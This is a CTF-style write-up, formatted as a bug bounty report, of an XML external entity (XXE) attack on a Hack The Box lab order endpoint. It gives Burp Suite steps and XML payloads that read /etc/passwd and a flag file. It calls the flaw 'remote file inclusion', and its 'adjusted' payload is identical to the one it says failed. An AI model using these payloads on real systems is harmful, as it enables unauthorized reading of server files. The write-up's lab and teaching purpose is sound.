# Bug Bounty Report

## Bug Details
- **Target:** [https://app.hackthebox.com/tracks/OWASP-Top-10](https://app.hackthebox.com/tracks/OWASP-Top-10) (baby WAFfles order machine)
- **Tool Used:** Burp Suite

## Bug Description
The application allows for a remote file inclusion vulnerability through improper handling of XML payloads in the order request.

## Steps to Reproduce
1. Use Burp Suite to intercept the order request.
2. Send the intercepted request to Repeater.
3. Change the content type to XML.
4. Replace the existing JSON with the following payload:
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY payload SYSTEM 'file:///etc/passwd'>]>
    <order>
    <food>&payload;</food>
    </order>
    ```
    -> This initially failed due to the requirement to choose a category first.

5. Investigate the orderController from the web source code to determine the required XML format.
6. Adjust the payload to the correct format:
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY payload SYSTEM 'file:///etc/passwd'>]>
    <order>
    <food>&payload;</food>
    </order>
    ```
    -> The input is not filtered at the orderController and passed directly.

7. Attempt to exploit the vulnerability with the following payload:
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY payload SYSTEM 'file:///flag'>]>
    <order>
    <food>&payload;</food>
    </order>
    ```
    -> Successfully retrieved sensitive information.

## Expected Behavior
The application should properly validate and sanitize user inputs, especially XML payloads, to prevent remote file inclusion vulnerabilities.

## Actual Behavior
The application allows for the inclusion of external entities via XML payloads without proper validation, leading to potential information disclosure.

## Vulnerability Impact
This vulnerability could lead to unauthorized access to sensitive files on the server, potentially exposing critical information.

## Proof of Concept
- Payload used:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE root [<!ENTITY payload SYSTEM 'file:///etc/passwd'>]>
  <order>
  <food>&payload;</food>
  </order>
  '''
- Successful retrieval of sensitive information.

## Affected Components
- The orderController in the application is affected by this vulnerability.

## Recommendations
1. Implement proper input validation and sanitization for XML payloads to prevent remote file inclusion vulnerabilities.

2. Regularly update and patch server-side components to mitigate potential security risks.